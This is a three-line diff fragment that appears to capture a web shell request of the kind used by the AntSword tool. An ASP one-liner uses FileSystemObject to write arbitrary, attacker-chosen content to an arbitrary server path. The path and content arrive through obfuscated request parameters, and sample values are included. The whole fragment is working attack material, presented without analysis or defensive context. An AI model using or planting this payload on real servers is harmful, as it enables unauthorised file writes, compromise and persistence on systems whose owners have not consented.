@@ -1,0 +1,3 @@
+pass=CreateObject("Scripting.FileSystemObject").CreateTextFile(""&bd(Request("hde447b53477c6"))&"").Write(""&bd(Request("oeec4554c61241"))&""):If Err Then:Response.Write("ERROR:// "&Err.Description):Else:Response.Write("1"):End If
+hde447b53477c6=D:/asp/test.txt
+oeec4554c61241=#Halo AntSword!
